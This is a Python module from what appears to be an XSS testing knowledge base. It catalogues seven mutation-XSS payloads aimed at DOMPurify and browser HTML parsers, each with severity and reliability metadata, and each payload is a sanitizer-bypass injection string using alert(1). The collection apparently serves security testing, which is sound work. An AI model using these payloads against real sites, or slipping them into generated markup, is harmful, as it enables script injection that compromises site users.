#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Mutation XSS (mXSS) Vectors
Targeting DOMPurify, Google Closure, and browser parsers.
"""

from ..models import PayloadEntry

MXSS_PAYLOADS = {
    # DOMPurify Bypasses (Historical & Theoretical)
    "mxss_dompurify_math": PayloadEntry(
        payload="<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=1 onerror=alert(1)&gt;\">",
        contexts=["html_content", "dompurify"], severity="critical", cvss_score=8.5,
        description="DOMPurify bypass via MathML nesting", tags=["mxss", "dompurify", "mathml"], reliability="medium"
    ),
    "mxss_dompurify_svg": PayloadEntry(
        payload="<svg><g/onload=alert(1)//<p>",
        contexts=["html_content", "dompurify"], severity="high", cvss_score=7.5,
        description="SVG handling confusion", tags=["mxss", "svg", "dompurify"], reliability="medium"
    ),
    "mxss_namespace_confusion": PayloadEntry(
        payload="<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
        contexts=["html_content", "sanitizer"], severity="high", cvss_score=8.0,
        description="Namespace confusion mXSS", tags=["mxss", "namespace"], reliability="high"
    ),
    
    # InnerHTML mXSS
    "mxss_innerhtml_listing": PayloadEntry(
        payload="<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
        contexts=["html_content", "innerhtml"], severity="high", cvss_score=7.0,
        description="Listing tag serialization mXSS", tags=["mxss", "listing"], reliability="medium"
    ),
    "mxss_template_shadow": PayloadEntry(
        payload="<template><iframe></template><script>alert(1)</script>",
        contexts=["html_content", "template"], severity="high", cvss_score=7.0,
        description="Template tag shadow DOM mXSS", tags=["mxss", "template"], reliability="medium"
    ),
    
    # CSS Sanitizer Bypass
    "mxss_css_quote_balance": PayloadEntry(
        payload="<style>*{font-family:'</style><img src=x onerror=alert(1)>'}</style>",
        contexts=["html_content", "css"], severity="high", cvss_score=7.5,
        description="CSS quote balancing mXSS", tags=["mxss", "css"], reliability="medium"
    ),
    
    # Generic Browser mXSS
    "mxss_comment_confusion": PayloadEntry(
        payload="<!--<img src=--><img src=x onerror=alert(1)//>",
        contexts=["html_content"], severity="high", cvss_score=7.0,
        description="Comment parsing confusion", tags=["mxss", "comment"], reliability="high"
    )
}

MXSS_TOTAL = len(MXSS_PAYLOADS)
